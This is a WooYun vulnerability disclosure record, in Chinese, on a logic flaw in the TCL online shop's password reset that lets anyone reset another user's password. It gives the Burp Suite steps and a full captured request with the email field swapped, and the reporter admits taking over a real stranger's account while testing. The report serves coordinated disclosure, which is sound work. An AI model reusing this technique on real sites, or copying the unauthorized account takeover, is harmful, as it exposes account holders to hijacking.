{"id": 48385, "wybug_id": "wooyun-2014-083159", "wybug_title": "TCL商城任意用户密码重置漏洞", "wybug_corp": "TCL官方网上商城", "wybug_author": "C木苦咖啡", "wybug_date": "2014-11-14 12:27", "wybug_open_date": "2014-12-29 12:28", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-29：\t细节向公众公开  简要描述： 在wooyun上看公开的漏洞的时候，发现某厂商给的乌币挺豪爽的，于是乎。。。。。 详细说明：  1.注册账号2.退出登录以后，点击\"忘记密码\"，输入刚才注册的邮箱，点击\"下一步\"3.进邮箱，看到\"TCL官网重设密码通知\"4.用burpsuite解包5.进入邮件点击找回链接截取到如下数据包POST /login/ResetPwd.html?auth=6bb5BQAACVYGBABVAQIKUFJQVwVWAlZUWAFSXQgRClxQXlFpREdRDVNaVyUAVwFKVwpZb0RDDVkTVzlNAF4DBlBRBwcJAgpUBgcJVgNQUwUHUABQUVRdAgQKVA1sElMDBAUOAwgFCl4 HTTP/1.1Host: shop.tcl.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://shop.tcl.com/login/ResetPwd.html?auth=6bb5BQAACVYGBABVAQIKUFJQVwVWAlZUWAFSXQgRClxQXlFpREdRDVNaVyUAVwFKVwpZb0RDDVkTVzlNAF4DBlBRBwcJAgpUBgcJVgNQUwUHUABQUVRdAgQKVA1sElMDBAUOAwgFCl4Cookie: QIAO_CK_undefined_R=http%3A//mail.163.com/js6/read/readhtml.jsp%3Fssid%3DK%252bWfcRcR0gvYN1aA0E4hJT5xlJswN8WIHlyF5iDMtOI%253d%26mid%3D163%3A1tbioxxD5FD+Xh69VgAAsd%26font%3D15%26color%3D064977; _dmvt_=1.3506751477411154000.1415859083.1415859088.1415864857.3; AUTHENTICATION=6hm9am4v5sgl7kre8bv6914eo5; Hm_lvt_9d2f247c649eb7b58fdb8d49b354fbd2=1415859097,1415859990,1415868544; Hm_lpvt_9d2f247c649eb7b58fdb8d49b354fbd2=1415868544; QIAO_CK_undefined_R=; tma=35223460.84563224.1415859100264.1415859100264.1415859100264.1; tmd=58.35223460.84563224.1415859100264.; baidu_qiao_v3_count_5298882=1; PHPSESSID=dk03u3tphh7t497s4bcerbon93; browse_histroy=d8512d5f82c6916abbca9407e41ca1ea1fbf953es%3A45%3A%22goods%7C%7C100%7C%7C1415860562%2Cgoods%7C%7C757%7C%7C1415859168%22%3B; is_returning=1; bfd_session_id=bfd_g=b56c782bcb75035d00004f4e00004d3754644ba2Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 55password=123456&repassword=123456&email=xxxxxxxxx6.xxxxxx位置修改为要重置账户的邮箱7.然后点击burpsuite的forward，发送数据8.登陆对方账号备注：由于注册的时候，邮箱输入框采用ajax检测邮箱是否注册，随便试了一下，发现存在npc@163.com邮箱，顺便重置了一下密码，罪过，本人无心，希望得到主的宽恕！！！   漏洞证明：  \n\n   修复方案：  。。。。   版权声明：转载请注明来源 C木苦咖啡@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-11-14 14:20 厂商回复： 感谢你的工作，已转交相关单位处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-14 13:38 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  在wooyun上看公开的漏洞的时候，发现某厂商给的乌币挺豪爽的，于是乎。。。。。    \n     2014-12-30 10:55 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  到底豪不豪爽?    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}